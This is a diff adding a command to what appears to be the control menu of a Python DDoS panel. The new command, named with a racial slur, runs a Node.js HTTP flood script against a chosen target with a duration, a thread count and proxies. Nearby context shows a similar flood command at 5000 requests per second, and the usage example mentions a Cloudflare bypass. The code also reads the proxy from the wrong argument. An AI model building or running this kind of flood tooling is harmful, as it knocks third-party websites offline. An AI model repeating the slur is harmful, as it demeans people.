@@ -632,6 +632,17 @@ def main():
                 print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
                 print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
 
+        elif "Nigga" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                proxy = cnc.split()[3]
+                os.system(f'node HTTP-NIGGA.js {target} {time} {thread} {proxy}')
+            except IndexError:
+                print('Usage: Nigga <target> <time> <threads> <proxy>')
+                print('Example: cf-bypass http://example.com 60 1250')
+
         
 
 # BANNERS
